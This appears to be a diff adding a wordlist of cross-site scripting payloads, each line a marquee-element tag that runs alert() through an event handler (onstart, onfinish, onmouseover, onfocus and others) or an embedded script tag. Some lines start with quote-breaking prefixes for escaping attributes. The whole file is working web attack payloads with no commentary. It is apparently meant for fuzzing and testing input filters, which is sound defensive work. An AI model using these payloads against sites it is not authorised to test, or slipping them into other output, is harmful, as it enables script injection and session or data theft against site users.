@@ -1,0 +1,55 @@
+<marquee draggable="true" ondrag="alert(1)">test</marquee>
+<marquee draggable="true" ondragend="alert(1)">test</marquee>
+<marquee draggable="true" ondragenter="alert(1)">test</marquee>
+<marquee draggable="true" ondragleave="alert(1)">test</marquee>
+<marquee draggable="true" ondragstart="alert(1)">test</marquee>
+'">><marquee><h1>XSS</h1></marquee>
+'>><marquee><h1>XSS</h1></marquee>
+<marquee id=x tabindex=1 onactivate=alert(1)></marquee>
+<marquee id=x tabindex=1 onbeforeactivate=alert(1)></marquee>
+<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>
+<marquee id=x tabindex=1 ondeactivate=alert(1)></marquee><input id=y autofocus>
+<marquee id=x tabindex=1 onfocus=alert(1)></marquee>
+<marquee id=x tabindex=1 onfocusin=alert(1)></marquee>
+<marquee loop=147 width=0 onfinish=alert(147)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<marquee onbeforecopy="alert(1)" contenteditable>test</marquee>
+<marquee onbeforecut="alert(1)" contenteditable>test</marquee>
+<marquee onbeforepaste="alert(1)" contenteditable>test</marquee>
+<marquee onblur=alert(1) tabindex=1 id=x></marquee><input autofocus>
+<marquee onclick="alert(1)">test</marquee>
+<marquee oncontextmenu="alert(1)">test</marquee>
+<marquee oncopy="alert(1)" contenteditable>test</marquee>
+<marquee oncut="alert(1)" contenteditable>test</marquee>
+<marquee ondblclick="alert(1)">test</marquee>
+<marquee onfocusout=alert(1) tabindex=1 id=x></marquee><input autofocus>
+<marquee onkeydown="alert(1)" contenteditable>test</marquee>
+<marquee onkeypress="alert(1)" contenteditable>test</marquee>
+<marquee onkeyup="alert(1)" contenteditable>test</marquee>
+<marquee onmousedown="alert(1)">test</marquee>
+<marquee onmouseenter="alert(1)">test</marquee>
+<marquee onmouseleave="alert(1)">test</marquee>
+<marquee onmousemove="alert(1)">test</marquee>
+<marquee onmouseout="alert(1)">test</marquee>
+<marquee onmouseover="alert(1)">test</marquee>
+<marquee onmouseup="alert(1)">test</marquee>
+<marquee onpaste="alert(1)" contenteditable>test</marquee>
+<marquee onScroll marquee onScroll="javascript:javascript:alert(1222)"></marquee onScroll>
+<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
+<marquee onScroll marquee onScroll="javascript:javascript:alert(323)"></marquee onScroll>
+<marquee/onstart=alert()>
+<marquee onstart=alert(1)>
+<marquee onstart=alert(146)>
+<marquee/onstart=alert(1)>xss
+<marquee onstart=alert(1)>XSS</marquee>
+<marquee onstart='javascript:alert('1');'>=(◕_◕)=
+<marquee onstart='javascript:alert(1975);'>=(◕_◕)=
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+<marquee onStart marquee onStart="javascript:javascript:alert(1216)"></marquee onStart>
+<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
+<marquee onStart marquee onStart="javascript:javascript:alert(317)"></marquee onStart>
+<mArquee onStart=[~[onmouseleave(([[(alert(1))]]))]] ]
+<marquee><script>alert(1724)</script></marquee>
+<marquee><script>alert('XSS')</script></marquee>
+<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
+<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
